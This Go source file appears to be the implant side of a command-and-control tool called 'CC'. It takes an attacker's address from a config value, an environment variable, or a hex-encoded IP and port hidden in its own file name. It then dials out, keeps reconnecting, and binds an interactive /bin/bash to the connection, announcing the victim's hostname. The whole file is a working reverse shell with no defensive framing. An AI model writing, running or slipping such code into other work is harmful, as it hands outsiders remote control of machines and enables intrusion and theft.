package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"github.com/paalgyula/cc/config"
	"github.com/paalgyula/cc/pkg/connection"
)

var (
	ErrNoRemote = errors.New("R is not configured")
)

func resolveRemoteFromName(name string) (string, error) {
	if strings.Contains(name, "-") {
		fragments := strings.Split(name, "-")
		addr := fragments[len(fragments)-1]

		if len(addr) != 12 {
			return "", errors.New("address must be 12 characters long")
		}

		ipbytes := make([]byte, 4)
		var port int

		r := bytes.NewBufferString(addr)

		// Simple parse for IP address from hex string
		_, err := fmt.Fscanf(r, "%02x%02x%02x%02x%04x",
			&ipbytes[0], &ipbytes[1], &ipbytes[2], &ipbytes[3], &port)

		if err != nil {
			return "", fmt.Errorf("resolveRemoteFromName: %w", err)
		}

		// Normalize IPv4 address
		return fmt.Sprintf("%d.%d.%d.%d:%d",
			ipbytes[0],
			ipbytes[1],
			ipbytes[2],
			ipbytes[3],
			port,
		), nil
	}

	return "", errors.New("WTF")
}

func findShell() string {
	// TODO: find shell executable
	return "/bin/bash"
}

func createShell(conn io.ReadWriter) {
	subProcess := exec.Command(findShell())
	// subProcess.SysProcAttr = &syscall.SysProcAttr{Setsid: true}

	subProcess.Stdin = conn
	subProcess.Stdout = conn
	subProcess.Stderr = conn

	// Start the command
	if err := subProcess.Start(); err != nil {
		fmt.Println("Failed to start command:", err)
		return
	}

	h, _ := os.Hostname()
	fmt.Fprintf(conn, "# CC connected %s\n", h)

	subProcess.Wait()
}

func resolveRemote() error {
	if config.Remote == "" {
		config.Remote = os.Getenv("R")

		if config.Remote == "" {
			resolveRemoteFromName(os.Args[0])
		}
	}

	if config.Remote == "" {
		return ErrNoRemote
	}

	config.Info("R is set to: %s", config.Remote)

	return nil
}

// Entry point
func main() {
	config.Info("Starting CC")

	// Resolving remote address
	if err := resolveRemote(); err != nil {
		fmt.Println("error: ", err.Error())

		return
	}

	retry := 0

	for {
		time.Sleep(time.Second * time.Duration(retry*retry))

		// Initiate connection to the remote
		conn, err := connection.Connect(config.Remote)
		if err != nil {
			if errors.Is(err, syscall.ECONNREFUSED) {
				retry++
				continue
			}

			config.Info("error: %v\n", err)
			os.Exit(1)
		}

		retry = 0
		defer conn.Close()
		createShell(conn)
	}
}
